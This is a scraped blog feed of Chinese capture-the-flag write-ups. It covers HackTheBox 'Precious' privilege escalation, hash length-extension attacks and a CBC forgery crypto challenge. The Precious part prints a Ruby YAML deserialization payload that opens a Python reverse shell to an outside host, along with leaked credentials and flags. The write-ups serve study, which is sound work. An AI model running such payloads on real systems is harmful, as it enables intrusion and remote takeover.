/home/ruby/.bundle/config</span><br></pre></td></tr></table></figure><p>得到用户henry的账户信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">BUNDLE_HTTPS:&#x2F;&#x2F;RUBYGEMS__ORG&#x2F;: &quot;henry:Q3c1AqGHtoI0aXAYFH&quot;</span><br></pre></td></tr></table></figure><p>SSH登入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh henry@10.10.11.189</span><br><span class="line">Q3c1AqGHtoI0aXAYFH</span><br></pre></td></tr></table></figure><p>查看flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /home/henry/user.txt </span><br><span class="line">c2495bbeca89a6c2caaabb23a05934a9</span><br></pre></td></tr></table></figure><h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for henry on precious:</span><br><span class="line">    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin</span><br><span class="line"></span><br><span class="line">User henry may run the following commands on precious:</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;ruby &#x2F;opt&#x2F;update_dependencies.rb</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat update_dependencies.rb</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Compare installed dependencies with those specified in &quot;dependencies.yml&quot;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;yaml&quot;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;rubygems&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">TODO:</span> update versions automatically</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_gems</span><span class="params">()</span></span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_from_file</span></span></span><br><span class="line">    YAML.load(File.read(<span class="string">&quot;dependencies.yml&quot;</span>))</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_local_gems</span></span></span><br><span class="line">    Gem::Specification.sort_by&#123; <span class="params">|g|</span> [g.name.downcase, g.version] &#125;.map&#123;<span class="params">|g|</span> [g.name, g.version.to_s]&#125;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">gems_file = list_from_file</span><br><span class="line">gems_local = list_local_gems</span><br><span class="line"></span><br><span class="line">gems_file.each <span class="keyword">do</span> <span class="params">|file_name, file_version|</span></span><br><span class="line">    gems_local.each <span class="keyword">do</span> <span class="params">|local_name, local_version|</span></span><br><span class="line">        <span class="keyword">if</span>(file_name == local_name)</span><br><span class="line">            <span class="keyword">if</span>(file_version != local_version)</span><br><span class="line">                puts <span class="string">&quot;Installed version differs from the one specified in file: &quot;</span> + local_name</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                puts <span class="string">&quot;Installed version is equals to the one specified in file: &quot;</span> + local_name</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>YAML.load()存在反序列化漏洞</p><blockquote><p><a href="https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/">https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/</a></p></blockquote><p>构造能够利用漏洞的yml文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp; vi /tmp/dependencies.yml</span><br></pre></td></tr></table></figure><p>文件内容如下</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="type">!ruby/object:Gem::Installer</span></span><br><span class="line">    <span class="attr">i:</span> <span class="string">x</span></span><br><span class="line"><span class="bullet">-</span> <span class="type">!ruby/object:Gem::SpecFetcher</span></span><br><span class="line">    <span class="attr">i:</span> <span class="string">y</span></span><br><span class="line"><span class="bullet">-</span> <span class="type">!ruby/object:Gem::Requirement</span></span><br><span class="line">  <span class="attr">requirements:</span></span><br><span class="line">    <span class="type">!ruby/object:Gem::Package::TarReader</span></span><br><span class="line">    <span class="attr">io:</span> <span class="string">&amp;1</span> <span class="type">!ruby/object:Net::BufferedIO</span></span><br><span class="line">      <span class="attr">io:</span> <span class="string">&amp;1</span> <span class="type">!ruby/object:Gem::Package::TarReader::Entry</span></span><br><span class="line">         <span class="attr">read:</span> <span class="number">0</span></span><br><span class="line">         <span class="attr">header:</span> <span class="string">&quot;abc&quot;</span></span><br><span class="line">      <span class="attr">debug_output:</span> <span class="string">&amp;1</span> <span class="type">!ruby/object:Net::WriteAdapter</span></span><br><span class="line">         <span class="attr">socket:</span> <span class="string">&amp;1</span> <span class="type">!ruby/object:Gem::RequestSet</span></span><br><span class="line">             <span class="attr">sets:</span> <span class="type">!ruby/object:Net::WriteAdapter</span></span><br><span class="line">                 <span class="attr">socket:</span> <span class="type">!ruby/module</span> <span class="string">&#x27;Kernel&#x27;</span></span><br><span class="line">                 <span class="attr">method_id:</span> <span class="string">:system</span></span><br><span class="line">             <span class="attr">git_set:</span> <span class="string">&quot;python3 -c \&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;10.10.*.*&#x27;,9997));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);\&quot;&quot;</span></span><br><span class="line">         <span class="attr">method_id:</span> <span class="string">:resolve</span></span><br></pre></td></tr></table></figure><p>监听端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9997</span><br></pre></td></tr></table></figure><p>触发反序列化漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/ruby /opt/update_dependencies.rb</span><br></pre></td></tr></table></figure><p>获得root权限，查看flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br><span class="line">a6c3884ed3b917b870834758ab46f9f1</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;日常记录&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="Pentest" scheme="https://yoloyolo.top/tags/Pentest/"/>
    
    <category term="HackTheBox" scheme="https://yoloyolo.top/tags/HackTheBox/"/>
    
  </entry>
  
  <entry>
    <title>Hash_Extend</title>
    <link href="https://yoloyolo.top/2023/02/21/Hash-Extend/"/>
    <id>https://yoloyolo.top/2023/02/21/Hash-Extend/</id>
    <published>2023-02-20T22:21:17.000Z</published>
    <updated>2023-02-21T12:06:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>日常记录</p><a id="more"></a><blockquote><p>pip install hashpumpy</p></blockquote><p>MD5, SHA1, SHA256每轮加密块大小为64Byte(512Bits)，其中前56Byte(448Bits)用于存储加密数据，后8Byte(64Bits)用于存储数据Bit位数</p><p>SHA512每轮加密块大小为128Byte(1024Bits)，其中前112Byte(896Bits)用于存储加密数据，后16Byte(128Bits)用于存储数据Bit位数</p><p>MD5存储数据长度时使用小端排序，SHA1, SHA256, SHA512则使用大端排序</p><p>SHA384在使用hashpumpy.pump时会报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashpumpy.error: unsupported hash size</span><br></pre></td></tr></table></figure><p>以上Hash算法均基于Merkle-Damgård结构，抽象来看，可以类比于对称加密中的OFB模式，即上一轮的加密结果会作为下一轮加密的输入</p><p>以MD5为例</p><p>我们要加密明文admin，此时明文长度小于加密块数据长度，则会被填充<code>\x80\x00\x00\x00...</code></p><p>那么加密块为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x28\x00\x00\x00\x00\x00\x00\x00</span><br></pre></td></tr></table></figure><p>在完成第一轮加密之后我们会得到这一部分的Hash值，如有后续部分，则这部分Hash将作为输入对后一轮加密进行处理</p><p>假设存在一个认证方式，将以下内容作为Cookie<br />username+signature<br />且signature=MD5(secret+username)<br />且在校验方法为<br />MD5(secret+input_username) == signature</p><p>我们以Alice身份登入后得到这个Cookie，即<br />MD5(secret+“Alice”)</p><p>如果secret长度已知，假设为6</p><p>那么可以得到以下加密块，以及其MD5值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">??????Alice\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x58\x00\x00\x00\x00\x00\x00\x00</span><br></pre></td></tr></table></figure><p>在加密块后续内容追加内容Bob，则可以将上一部分的MD5作为下一轮加密的输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">??????Alice\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x58\x00\x00\x00\x00\x00\x00\x00Bob</span><br></pre></td></tr></table></figure><p>即可得到这部分的MD5值</p><p>在进行认证时，可以使用以下用户名以及其相应的MD5</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;&quot;Alice\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x58\x00\x00\x00\x00\x00\x00\x00Bob&quot;</span><br></pre></td></tr></table></figure><p>服务器在验证身份</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MD5(secert+&quot;Alice\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x58\x00\x00\x00\x00\x00\x00\x00Bob&quot;) &#x3D;&#x3D; signature</span><br></pre></td></tr></table></figure><p>即完成了哈希扩展攻击，如果服务器对用户名的验证存在不安全的逻辑，那么就有可能越权漏洞</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;日常记录&lt;/p&gt;</summary>
    
    
    
    <category term="Study" scheme="https://yoloyolo.top/categories/Study/"/>
    
    
    <category term="Crypto" scheme="https://yoloyolo.top/tags/Crypto/"/>
    
    <category term="Hash" scheme="https://yoloyolo.top/tags/Hash/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox_Flippin_Bank</title>
    <link href="https://yoloyolo.top/2023/02/20/HackTheBox-Flippin-Bank/"/>
    <id>https://yoloyolo.top/2023/02/20/HackTheBox-Flippin-Bank/</id>
    <published>2023-02-19T21:33:53.000Z</published>
    <updated>2023-02-20T10:47:07.000Z</updated>
    
    <content type="html"><![CDATA[<p>Dramatically solved.</p><a id="more"></a><h1 id="hackthebox_flippin_bank"><a class="markdownIt-Anchor" href="#hackthebox_flippin_bank"></a> HackTheBox_Flippin_Bank</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socketserver </span><br><span class="line"><span class="keyword">import</span> socket, os</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad,unpad</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wlcm_msg =<span class="string">&#x27;########################################################################\n&#x27;</span>+\</span><br><span class="line">          <span class="string">&#x27;#                  Welcome to the Bank of the World                    #\n&#x27;</span>+\</span><br><span class="line">          <span class="string">&#x27;#             All connections are monitored and recorded               #\n&#x27;</span>+\</span><br><span class="line">          <span class="string">&#x27;#      Disconnect IMMEDIATELY if you are not an authorized user!       #\n&#x27;</span>+\</span><br><span class="line">          <span class="string">&#x27;########################################################################\n&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = get_random_bytes(<span class="number">16</span>)</span><br><span class="line">iv = get_random_bytes(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt_data</span>(<span class="params">data</span>):</span></span><br><span class="line">    padded = pad(data.encode(),<span class="number">16</span>,style=<span class="string">&#x27;pkcs7&#x27;</span>)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC,iv)</span><br><span class="line">    enc = cipher.encrypt(padded)</span><br><span class="line">    <span class="keyword">return</span> enc.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_data</span>(<span class="params">encryptedParams</span>):</span></span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC,iv)</span><br><span class="line">    paddedParams = cipher.decrypt( unhexlify(encryptedParams))</span><br><span class="line">    print(paddedParams)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;admin&amp;password=g0ld3n_b0y&#x27;</span> <span class="keyword">in</span> unpad(paddedParams,<span class="number">16</span>,style=<span class="string">&#x27;pkcs7&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_msg</span>(<span class="params">s, msg</span>):</span></span><br><span class="line">    enc = msg.encode()</span><br><span class="line">    s.send(enc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">s</span>):</span></span><br><span class="line">    send_msg(s, <span class="string">&#x27;username: &#x27;</span>)</span><br><span class="line">    user = s.recv(<span class="number">4096</span>).decode().strip()</span><br><span class="line"></span><br><span class="line">    send_msg(s, user +<span class="string">&quot;&#x27;s password: &quot;</span> )</span><br><span class="line">    passwd = s.recv(<span class="number">4096</span>).decode().strip()</span><br><span class="line">    </span><br><span class="line">    send_msg(s, wlcm_msg)</span><br><span class="line"></span><br><span class="line">    msg = <span class="string">&#x27;logged_username=&#x27;</span> + user +<span class="string">&#x27;&amp;password=&#x27;</span> + passwd</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">assert</span>(<span class="string">&#x27;admin&amp;password=g0ld3n_b0y&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> msg)</span><br><span class="line">    <span class="keyword">except</span> AssertionError:</span><br><span class="line">        send_msg(s, <span class="string">&#x27;You cannot login as an admin from an external IP.\nYour activity has been logged. Goodbye!\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line">    msg = <span class="string">&#x27;logged_username=&#x27;</span> + user +<span class="string">&#x27;&amp;password=&#x27;</span> + passwd</span><br><span class="line">    send_msg(s, <span class="string">&quot;Leaked ciphertext: &quot;</span> + encrypt_data(msg)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    send_msg(s,<span class="string">&quot;enter ciphertext: &quot;</span>)</span><br><span class="line"></span><br><span class="line">    enc_msg = s.recv(<span class="number">4096</span>).decode().strip()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        check = decrypt_data(enc_msg)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        send_msg(s, <span class="built_in">str</span>(e) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        s.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> check:</span><br><span class="line">        send_msg(s, <span class="string">&#x27;Logged in successfully!\nYour flag is: &#x27;</span>+ FLAG)</span><br><span class="line">        s.close()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        send_msg(s, <span class="string">&#x27;Please try again.&#x27;</span>)</span><br><span class="line">        s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TaskHandler</span>(<span class="params">socketserver.BaseRequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self</span>):</span></span><br><span class="line">        main(self.request)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    socketserver.ThreadingTCPServer.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    server = socketserver.ThreadingTCPServer((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">1337</span>), TaskHandler)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure><h2 id="cbc字节翻转"><a class="markdownIt-Anchor" href="#cbc字节翻转"></a> CBC字节翻转？</h2><p>一眼CBC字节翻转</p><p>看一半发现IV不可控</p><h2 id="cbc密码块构造"><a class="markdownIt-Anchor" href="#cbc密码块构造"></a> CBC密码块构造</h2><p>想了一下可以构造伪密码块</p><p>CBC大概加解密流程如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Plain_Block -&gt; Xor(Last_Cipher_Block&#x2F;IV) -&gt; Block Cipher Encrypt -&gt; Cipher_Block -&gt; Xor(Last_Cipher_Block&#x2F;IV) -&gt; Plain_Block</span><br></pre></td></tr></table></figure><p>题目中的所需密码块如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    Plain_Block_0       Plain_Block_1       Plain_Block_2</span><br><span class="line">    logged_username&#x3D;    admin&amp;password&#x3D;g    0ld3n_b0y</span><br><span class="line">IV  Cipher_Block_0      Cipher_Block_1      Cipher_Block_2</span><br></pre></td></tr></table></figure><p><code>Key</code>, <code>IV</code>, <code>Plain_Block_0</code>固定，则<code>Cipher_Block_0</code>固定</p><p>攻击思路如下</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">target = Plain_Block_1 ^ Cipher_Block_0</span><br><span class="line">Cipher_Block_1 = encrypt(target)</span><br><span class="line">Cipher_Block_2 = encrypt(Plain_Block_2 ^ Cipher_Block_1)</span><br></pre></td></tr></table></figure><p>我们可以在<code>Plain_Block_1</code>与<code>Plain_Block_2</code>中间插入<code>Plain_Block_Payload</code><br />并且满足以下条件</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cipher_Block_Payload = encrypt(Plain_Block_Payload ^ Cipher_Block_1)</span><br><span class="line">Cipher_Block_Payload == Cipher_Block_1</span><br></pre></td></tr></table></figure><p>在这种情况下则有</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cipher_Block_Payload == Cipher_Block_1</span><br><span class="line">Cipher_Block_Payload ^ Plain_Block_2 == Cipher_Block_1 ^ Plain_Block_2</span><br><span class="line">encrypt(Cipher_Block_Payload ^ Plain_Block_2) == encrypt(Cipher_Block_1 ^ Plain_Block_2) == Cipher_Block_2</span><br></pre></td></tr></table></figure><p>即我们可以获得Get Flag情况下<code>Cipher_Block_2</code>的内容</p><p>但是<code>Plain_Block_Payload</code>该如何构造？</p><h2 id="payload明文密码块构造"><a class="markdownIt-Anchor" href="#payload明文密码块构造"></a> Payload明文密码块构造</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Cipher_Block_Payload == Cipher_Block_1</span><br><span class="line">encrypt(Plain_Block_Payload ^ Cipher_Block_1) == encrypt(Plain_Block_1 ^ Cipher_Block_0)</span><br><span class="line">Plain_Block_Payload ^ Cipher_Block_1 == Plain_Block_1 ^ Cipher_Block_0</span><br><span class="line">Plain_Block_Payload == Plain_Block_1 ^ Cipher_Block_0 ^ Cipher_Block_1</span><br></pre></td></tr></table></figure><p>所需的三个条件已知，所以我们可以很轻松的得到<code>Plain_Block_Payload</code></p><h2 id="encode-decode"><a class="markdownIt-Anchor" href="#encode-decode"></a> Encode &amp; Decode</h2><p>将构造的内容用pwntools发出后没有收到响应</p><p>多次调试后发现问题所在</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">send_msg(s, user +<span class="string">&quot;&#x27;s password: &quot;</span> )</span><br><span class="line">passwd = s.recv(<span class="number">4096</span>).decode().strip()</span><br></pre></td></tr></table></figure><p>本地生成算出Payload Hex形式后转字符串是用<code>ISO-8859-1</code>编码，这个单字节编码在处理<code>\x7a</code>以上的字符时很好用，所以顺手就用这个编码去处理Payload了</p><p>但是问题随之而来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UnicodeDecodeError: &#39;utf-8&#39; codec can&#39;t decode byte 0xa6 in position 15: invalid start byte</span><br></pre></td></tr></table></figure><p>也就是意味着我的Payload需要能够被UTF-8编码处理</p><p>WTF?</p><h2 id="guessing-game"><a class="markdownIt-Anchor" href="#guessing-game"></a> Guessing Game</h2><p>所以现在所能做的，就只有去修改<code>Plain_Block_1</code>的内容</p><p><code>Plain_Block_1</code>内容如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?????&amp;password&#x3D;?</span><br></pre></td></tr></table></figure><p>爆破六位掩码，这会影响<code>Cipher_Block_1</code>的结果</p><p>由于AES加密过程的扩散性，我们可以将<code>Cipher_Block_1</code>的结果看成是随机的</p><p>我们所需要的结果是<code>Payload_Block_Payload</code>的16字节均小于<code>\x80</code>，这样UTF-8编码就能处理</p><p>概率为1/65536，但值得一试</p><p>我们再理一遍思路</p><p>原始密码块如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    Plain_Block_0       Plain_Block_1       Plain_Block_2</span><br><span class="line">    logged_username&#x3D;    admin&amp;password&#x3D;g    0ld3n_b0y</span><br><span class="line">IV  Cipher_Block_0      Cipher_Block_1      Cipher_Block_2</span><br></pre></td></tr></table></figure><p>我们需要的XOR结果如下</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target = Cipher_Block_0 ^ Plain_Block_1</span><br></pre></td></tr></table></figure><p>现在我们开始爆破<code>Plain_Block_1</code>，可以得到<code>Tmp_Cipher_Block_1</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    Plain_Block_0       Tmp_Plain_Block_1   Tmp_Plain_Block_Payload     Plain_Block_2</span><br><span class="line">    logged_username&#x3D;    ?????&amp;password&#x3D;?    ????????????????            0ld3n_b0y</span><br><span class="line">IV  Cipher_Block_0      Tmp_Cipher_Block_1  Tmp_Cipher_Block_Payload    Cipher_Block_2</span><br></pre></td></tr></table></figure><p>得到的<code>Tmp_Cipher_Block_1</code>视为随机生成，可以轻松得到<code>Tmp_Plain_Block_Payload</code></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tmp_Plain_Block_Payload = Tmp_Cipher_Block_1 ^ target</span><br></pre></td></tr></table></figure><p>我们所需要确保的，就是这个<code>Tmp_Plain_Block_Payload</code>可以被UTF-8编码处理</p><p>在爆破出<code>Tmp_Plain_Block_Payload</code>之后，由于<code>Tmp_Cipher_Block_Payload</code>与<code>Cipher_Block_1</code>相等，<code>Cipher_Block_2</code>为预期值</p><p>输入<code>Cipher_Block_0 + Tmp_Cipher_Block_Payload + Cipher_Block_2</code>即可获得Flag</p><hr/><h2 id=""><a class="markdownIt-Anchor" href="#"></a> 😅</h2><p>不需要验证前面的&quot;logged_username=&quot;是吧</p><p>直接字节翻转就完事了</p><p>密码块如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 